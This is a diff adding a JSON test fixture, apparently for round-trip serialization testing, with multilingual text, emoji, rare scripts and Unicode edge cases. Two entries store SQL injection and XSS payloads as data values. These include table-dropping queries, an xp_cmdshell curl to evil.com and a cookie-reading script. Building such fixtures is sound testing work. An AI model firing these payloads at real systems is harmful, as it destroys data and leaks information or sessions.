@@ -1,0 +1,429 @@
+[
+  {
+    "id": 1,
+    "category": "unicode",
+    "title": "🌐 Unicode 16.0 Multi-Language Sample 🌍",
+    "description": "A comprehensive JSON sample for round-trip testing with multi-language text.",
+    "greetings": {
+      "en": "Hello, World!",
+      "zh": "你好，世界！",
+      "ja": "こんにちは世界！",
+      "ko": "안녕하세요, 세계!",
+      "ar": "مرحباً بالعالم!",
+      "he": "שלום עולם!",
+      "hi": "नमस्ते दुनिया!",
+      "th": "สวัสดีชาวโลก!",
+      "ru": "Здравствуй, мир!",
+      "el": "Γειά σου, κόσμε!",
+      "ur": "ہیلو دنیا!",
+      "fa": "سلام دنیا!",
+      "km": "សួស្តីពិភពលោក!",
+      "my": "မင်္ဂလာပါကမ္ဘာလောက!",
+      "am": "ሰላም ልዑል!",
+      "chr": "ᎣᏏᏲ ᎡᎶᎯ!",
+      "yi": "העלא וועלט!",
+      "bo": "བཀྲ་ཤིས་བདེ་ལེགས། འཛམ་གླིང་།",
+      "si": "ආයුබෝවන් ලෝකය!"
+    }
+  },
+  {
+    "id": 2,
+    "category": "emoji",
+    "title": "😀 Comprehensive Emoji Test 🎯",
+    "smileys": "😀😃😄😁😆😅🤣😂🙂🙃🫠😉😊😇🥰😍🤩😘😗☺️😚😙🥲😋😛😜🤪😝🤑🤗🤭🫢🫣🤫🤔🫡🤐🤨😐😑😶🫥😏😒🙄😬🤥🫨😌😔😪🤤😴😷🤒🤕🤢🤮🤧🥵🥶🥴😵🤯🤠🥳🥸😎🤓🧐😕🫤😟🙁☹️😮😯😲😳🥺😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡🤬💀☠️💩🤡👹👺👻👽👾🤖",
+    "skin_tones": {
+      "thumbs_up": [
+        "👍",
+        "👍🏻",
+        "👍🏼",
+        "👍🏽",
+        "👍🏾",
+        "👍🏿"
+      ],
+      "raised_hands": [
+        "🙌",
+        "🙌🏻",
+        "🙌🏼",
+        "🙌🏽",
+        "🙌🏾",
+        "🙌🏿"
+      ],
+      "folded_hands": [
+        "🙏",
+        "🙏🏻",
+        "🙏🏼",
+        "🙏🏽",
+        "🙏🏾",
+        "🙏🏿"
+      ]
+    },
+    "zwj_sequences": [
+      "👨‍👩‍👧‍👦",
+      "👨‍👩‍👧‍👧‍👦",
+      "👨‍👨‍👧",
+      "👩‍👩‍👦",
+      "🫱‍🫲",
+      "🧔‍♀️",
+      "🧔‍♂️",
+      "👩‍⚕️",
+      "👨‍⚕️",
+      "👩‍🎓",
+      "👨‍🎓"
+    ],
+    "flags": [
+      "🏳️‍🌈",
+      "🏳️‍⚧️",
+      "🏴󠁧󠁢󠁥󠁮󠁧󠁿",
+      "🏴󠁧󠁢󠁳󠁣󠁴󠁿",
+      "🏴󠁧󠁢󠁷󠁬󠁳󠁿",
+      "🇺🇳",
+      "🇪🇺"
+    ],
+    "unicode_15_plus": [
+      "🫨",
+      "🫸",
+      "🫹",
+      "🫷",
+      "🩷",
+      "🩵",
+      "🩶",
+      "🪺",
+      "🪹",
+      "🫘",
+      "🫚",
+      "🫛",
+      "🫜",
+      "🫟",
+      "🫠",
+      "🫡",
+      "🫢",
+      "🫣",
+      "🫤",
+      "🫥",
+      "🫦",
+      "🫧",
+      "🫨",
+      "🫩",
+      "🫪",
+      "🫫",
+      "🫬",
+      "🫭",
+      "🫮",
+      "🫯",
+      "🫰",
+      "🫱",
+      "🫲",
+      "🫳",
+      "🫴",
+      "🫵",
+      "🫶",
+      "🫷",
+      "🫸",
+      "🫹",
+      "🫺",
+      "🫻",
+      "🫼",
+      "🫽",
+      "🫾",
+      "🫿"
+    ]
+  },
+  {
+    "id": 3,
+    "category": "scripts",
+    "title": "📜 Ancient & Modern Scripts",
+    "egyptian_hieroglyphs": "𓀀𓀁𓀂𓀃𓀄𓀅𓀆𓀇𓀈𓀉𓀊𓀋𓀌𓀍𓀎𓀏",
+    "cuneiform": "𒀀𒀁𒀂𒀃𒀄𒀅𒀆𒀇𒀈𒀉𒀊𒀋𒀌𒀍𒀎𒀏",
+    "linear_b": "𐀀𐀁𐀂𐀃𐀄𐀅𐀆𐀇𐀈𐀉𐀊𐀋𐀍𐀎𐀏",
+    "ogham": "᚛ᚑᚌᚐᚅ᚜ ᚁᚂᚃᚄᚅᚆᚇᚈᚉᚊᚋᚌᚍᚎᚏᚐᚑᚒᚓᚔᚕᚖ",
+    "runic": "ᚠᚡᚢᚣᚤᚥᚦᚧᚨᚩᚪᚫᚬᚭᚮᚯᚰᚱᚲᚳᚴᚵᚶᚷᚸᚹᚺᚻᚼᚽᚾᚿᛀᛁᛂᛃᛄᛅᛆᛇᛈᛉᛊᛋᛌᛍᛎᛏᛐᛑᛒᛓᛔᛕᛖᛗᛘᛙᛚᛛᛜᛝᛞᛟᛠᛡᛢᛣᛤᛥᛦᛧᛨᛩᛪ᛫᛬᛭ᛮᛯᛰ",
+    "coptic": "ⲀⲁⲂⲃⲄⲅⲆⲇⲈⲉⲊⲋⲌⲍⲎⲏⲐⲑⲒⲓⲔⲕⲖⲗⲘⲙⲚⲛⲜⲝⲞⲟⲠⲡⲢⲣⲤⲥⲦⲧⲨⲩⲪⲫⲬⲭⲮⲯⲰⲱⲲⲳⲴⲵⲶⲷⲸⲹⲺⲻⲼⲽⲾⲿ",
+    "gothic": "𐌰𐌱𐌲𐌳𐌴𐌵𐌶𐌷𐌸𐌹𐌺𐌻𐌼𐌽𐌾𐌿𐍀𐍁𐍂𐍃𐍄𐍅𐍆𐍇𐍈𐍉𐍊",
+    "deseret": "𐐀𐐁𐐂𐐃𐐄𐐅𐐆𐐇𐐈𐐉𐐊𐐋𐐌𐐍𐐎𐐏𐐐𐐑𐐒𐐓𐐔𐐕𐐖𐐗𐐘𐐙𐐚𐐛𐐜𐐝𐐞𐐟𐐠𐐡𐐢𐐣𐐤𐐥𐐦𐐧",
+    "cherokee": "ᎠᎡᎢᎣᎤᎥᎦᎧᎨᎩᎪᎫᎬᎭᎮᎯᎰᎱᎲᎳᎴᎵᎶᎷᎸᎹᎺᎻᎼᎽᎾᎿᏀᏁᏂᏃᏄᏅᏆᏇᏈᏉᏊᏋᏌᏍᏎᏏᏐᏑᏒᏓᏔᏕᏖᏗᏘᏙᏚᏛᏜᏝᏞᏟᏠᏡᏢᏣᏤᏥᏦᏧᏨᏩᏪᏫᏬᏭᏮᏯᏰᏱᏲᏳᏴ",
+    "mongolian": "ᠮᠣᠩᠭᠣᠯ ᠪᠢᠴᠢᠭ᠌ ᠮᠣᠩᠭᠣᠯ ᠬᠡᠯᠡ",
+    "tibetan": "ༀཀཁགངཆཇཉཊཋཌཎཏཐདདྷནཔཕབྷཙཚཛཝཞཟའཡརལཤཥསཧཨ"
+  },
+  {
+    "id": 4,
+    "category": "edge_cases",
+    "title": "⚡ Unicode Edge Cases",
+    "combining_chars": "Z̧̨̡̢̤̥̲̦̬̮̰̹̺̻̼̽̾̿̀́͂̓̈́ͅ",
+    "zalgo_text": "n͂͗̊͑̽͆̋̎̐̌o͌͗̆̎̑̋̊̉̉r͌̒̾̈̾̊̌m̑̆̏̈͆̓̾a͊̓̑͝l̾̑̄̊͋̏̉",
+    "fullwidth": "ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ１２３４５６７８９！＂＃＄％＆＇（）",
+    "halfwidth_katakana": "ﾊﾝｶｸｶﾀｶﾅ ｶﾀｶﾅ ﾃｽﾄ ｱｲｳｴｵ",
+    "bidi_mixed": "שָׁלוֹם עֲלֵיכֶם 你好 こんにちは 안녕하세요 السلام عليكم",
+    "invisible_chars": "​‌‍‎‏⁠﻿",
+    "variation_selectors": [
+      "☹️",
+      "☹︎",
+      "❤️",
+      "❤︎",
+      "🚩︎",
+      "🚩️"
+    ],
+    "cjk_ext_b": "𠀀𠀁𠀂𠀃𠀄𠀅𠀆𠀇𠀈𠀉𠀊𠀋𠀌𠀍𠀎𠀏𠮷𠮟𩷶𪚲𫜴",
+    "mathematical": "∑∏∫√∂∆∐≈≠≡≤≥⊕⊗⊖⊛⊥∞∠∟∡∢∣∥∧∨∩∪⊂⊃⊆⊇∀∃∄∈∉∋∌",
+    "box_drawing": "┌┬┐├┼┤└┴┘╔╦╗╠╬╣╚╩╝═║╒╓╔╕╖╗╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬",
+    "braille": "⠁⠂⠃⠄⠅⠆⠇⠈⠉⠊⠋⠌⠍⠎⠏⠐⠑⠒⠓⠔⠕⠖⠗⠘⠙⠚⠛⠜⠝⠞⠟⠠⠡⠢⠣⠤⠥⠦⠧⠨⠩⠪⠫⠬⠭⠮⠯⠰⠱⠲⠳⠴⠵⠶⠷⠸⠹⠺⠻⠼⠽⠾⠿",
+    "tags_block": "🏴󠁧󠁢󠁥󠁮󠁧󠁿"
+  },
+  {
+    "id": 5,
+    "category": "sql_injection",
+    "title": "⚠️ SQL Injection Payloads as Data",
+    "description": "These are SQL injection payloads stored as JSON data values for round-trip testing.",
+    "payloads": [
+      {
+        "id": "sqli-1",
+        "type": "tautology",
+        "value": "' OR '1'='1"
+      },
+      {
+        "id": "sqli-2",
+        "type": "tautology",
+        "value": "1' OR '1'='1' /*"
+      },
+      {
+        "id": "sqli-3",
+        "type": "comment",
+        "value": "admin'--"
+      },
+      {
+        "id": "sqli-4",
+        "type": "comment",
+        "value": "admin'#"
+      },
+      {
+        "id": "sqli-5",
+        "type": "union",
+        "value": "' UNION SELECT * FROM users--"
+      },
+      {
+        "id": "sqli-6",
+        "type": "union",
+        "value": "' UNION ALL SELECT NULL,NULL,NULL--"
+      },
+      {
+        "id": "sqli-7",
+        "type": "stacked",
+        "value": "'; DROP TABLE users; --"
+      },
+      {
+        "id": "sqli-8",
+        "type": "stacked",
+        "value": "1'; DELETE FROM orders WHERE 1=1; --"
+      },
+      {
+        "id": "sqli-9",
+        "type": "time_based",
+        "value": "1' AND SLEEP(5)--"
+      },
+      {
+        "id": "sqli-10",
+        "type": "time_based",
+        "value": "1' AND (SELECT pg_sleep(5))--"
+      },
+      {
+        "id": "sqli-11",
+        "type": "time_based",
+        "value": "1' WAITFOR DELAY '0:0:5'--"
+      },
+      {
+        "id": "sqli-12",
+        "type": "boolean",
+        "value": "1' AND 1=1--"
+      },
+      {
+        "id": "sqli-13",
+        "type": "boolean",
+        "value": "1' AND 1=2--"
+      },
+      {
+        "id": "sqli-14",
+        "type": "error_based",
+        "value": "1' AND extractvalue(1,concat(1,(select version())))--"
+      },
+      {
+        "id": "sqli-15",
+        "type": "error_based",
+        "value": "1' AND updatexml(1,concat(1,(select database())),1)--"
+      },
+      {
+        "id": "sqli-16",
+        "type": "out_of_band",
+        "value": "1' EXEC xp_cmdshell 'curl http://evil.com'--"
+      },
+      {
+        "id": "sqli-17",
+        "type": "out_of_band",
+        "value": "1' OR UTL_HTTP.request('http://evil.com')--"
+      },
+      {
+        "id": "sqli-18",
+        "type": "order_by",
+        "value": "1' ORDER BY 1--"
+      },
+      {
+        "id": "sqli-19",
+        "type": "order_by",
+        "value": "1' ORDER BY 999--"
+      },
+      {
+        "id": "sqli-20",
+        "type": "group_by",
+        "value": "1' HAVING 1=1--"
+      },
+      {
+        "id": "sqli-21",
+        "type": "into_outfile",
+        "value": "1' INTO OUTFILE '/tmp/evil.txt'--"
+      },
+      {
+        "id": "sqli-22",
+        "type": "into_dumpfile",
+        "value": "1' INTO DUMPFILE '/tmp/evil.txt'--"
+      },
+      {
+        "id": "sqli-23",
+        "type": "information_schema",
+        "value": "' UNION SELECT table_name FROM information_schema.tables--"
+      },
+      {
+        "id": "sqli-24",
+        "type": "pg_tables",
+        "value": "' UNION SELECT tablename FROM pg_tables--"
+      },
+      {
+        "id": "sqli-25",
+        "type": "system_user",
+        "value": "1' AND user_name()='sa'--"
+      },
+      {
+        "id": "sqli-26",
+        "type": "nested",
+        "value": "1' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--"
+      },
+      {
+        "id": "sqli-27",
+        "type": "nested",
+        "value": "1' OR (SELECT COUNT(*) FROM users WHERE username='admin')--"
+      },
+      {
+        "id": "sqli-28",
+        "type": "like_wildcard",
+        "value": "admin' OR username LIKE '%admin%'--"
+      },
+      {
+        "id": "sqli-29",
+        "type": "regexp",
+        "value": "admin' OR username REGEXP '.*'--"
+      },
+      {
+        "id": "sqli-30",
+        "type": "benchmark",
+        "value": "1' AND BENCHMARK(10000000,MD5(1))--"
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "category": "html_xss",
+    "title": "🔐 HTML/XSS Payloads as Data",
+    "payloads": [
+      "<script>alert('xss')</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(document.cookie)>",
+      "javascript:alert('URL XSS')",
+      "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
+      "<div onmouseover='alert(`xss`)'>hover me</div>",
+      "<body onload=alert(1)>",
+      "<iframe src=javascript:alert(1)>",
+      "<a href='javascript:alert(1)'>click me</a>",
+      "<math><mtext><table><mglyph><svg><mtext><table><mglyph><svg><style><!--</style><img src=x onerror=alert(1)>"
+    ]
+  },
+  {
+    "id": 7,
+    "category": "numbers_formats",
+    "title": "🔢 Number Systems & Formats",
+    "arabic_indic": "٠١٢٣٤٥٦٧٨٩",
+    "extended_arabic_indic": "۰۱۲۳۴۵۶۷۸۹",
+    "bengali": "০১২৩৪৫৬৭৮৯",
+    "gujarati": "૦૧૨૩૪૫૬૭૮૯",
+    "gurmukhi": "੦੧੨੩੪੫੬੭੮੯",
+    "thai": "๐๑๒๓๔๕๖๗๘๙",
+    "tibetan": "༠༡༢༣༤༥༦༧༨༩",
+    "myanmar": "၀၁၂၃၄၅၆၇၈၉",
+    "khmer": "០១២៣៤៥៦៧៨៩",
+    "limbu": "᥆᥇᥈᥉᥊᥋᥌᥍᥎᥏",
+    "mongolian": "᠐᠑᠒᠓᠔᠕᠖᠗᠘᠙",
+    "fullwidth_digits": "０１２３４５６７８９",
+    "roman_numerals": "ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅬⅭⅮⅯ",
+    "scientific": "1.23e-10 6.022e23 3.14159e0 -Infinity NaN"
+  },
+  {
+    "id": 8,
+    "category": "nested",
+    "title": "📦 Deeply Nested Structures",
+    "level1": {
+      "level2": {
+        "level3": {
+          "level4": {
+            "message": "🎉 Deep nesting survived round-trip!",
+            "unicode_values": {
+              "zh": "深层嵌套数据",
+              "ja": "深い入れ子データ",
+              "ar": "بيانات متداخلة عميقة",
+              "he": "נתונים מקוננים עמוקים",
+              "emoji": "🗺️🧭🔍✅🔄"
+            }
+          }
+        },
+        "sql_payloads": [
+          "' OR 1=1--",
+          "admin'--",
+          "'; DROP--"
+        ]
+      }
+    },
+    "arrays_of_arrays": [
+      [
+        "😀",
+        "😁",
+        "😂"
+      ],
+      [
+        "🤣",
+        "😃",
+        "😄"
+      ],
+      [
+        [
+          "👨‍👩‍👧‍👦",
+          "👩‍👩‍👧"
+        ],
+        [
+          "🧑‍🤝‍🧑",
+          "👩‍⚕️"
+        ]
+      ]
+    ],
+    "mixed_types": [
+      null,
+      true,
+      false,
+      42,
+      3.141592653589793,
+      "🌍 Unicode string",
+      {
+        "nested": "✅"
+      },
+      [
+        "a",
+        "b",
+        "c"
+      ]
+    ]
+  }
+]
